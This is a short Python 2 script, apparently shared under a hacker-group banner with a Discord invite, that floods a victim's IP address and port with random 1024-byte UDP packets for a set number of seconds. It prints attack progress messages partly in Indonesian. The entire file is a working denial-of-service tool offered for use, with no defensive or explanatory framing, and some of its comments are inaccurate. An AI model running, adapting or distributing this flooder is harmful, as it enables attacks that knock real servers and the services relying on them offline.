
import time
import socket
import random
import sys

def usage():
    print "dP                                dP        dP                    a88888b.                dP           888888ba           dP     dP"
    print "88                                88        88                   d8'   `88                88           88    `8b          88     88                    "
    print "88        .d8888b. 88d888b. .d888b88        88 .d8888b. dP    dP 88        .d8888b. .d888b88 .d8888b. a88aaaa8P' dP    dP 88aaaaa88a .d8888b. 88d888b."
    print "88        88'  `88 88'  `88 88'  `88        88 88'  `88 88    88 88        88'  `88 88'  `88 88ooood8  88   `8b. 88    88 88     88  88'  `88 88'  `88"
    print "88        88.  .88 88       88.  .88 88.  .d8P 88.  .88 88.  .88 Y8.   .88 88.  .88 88.  .88 88.  ...  88    .88 88.  .88 88     88  88.  .88 88    88"
    print "88888888P `88888P' dP       `88888P8  `Y8888'  `88888P8 `8888P88  Y88888P' `88888P' `88888P8 `88888P'  88888888P `8888P88 dP     dP  `88888P8 dP    dP"
    print "ooooooooooooooooooooooooooooooooooooooooooooooooooooooooo~~~~.88~ooooooooooooooooooooooooooooooooooooooooooooooooo~~~~.88~ooooooooooooooooooooooooooooo"
    print "#   LinkDiscord:https://discord.gg/9KPqzSzNq9 \033[1;32m #"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Menyerang %s mengirim paket %s at the port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

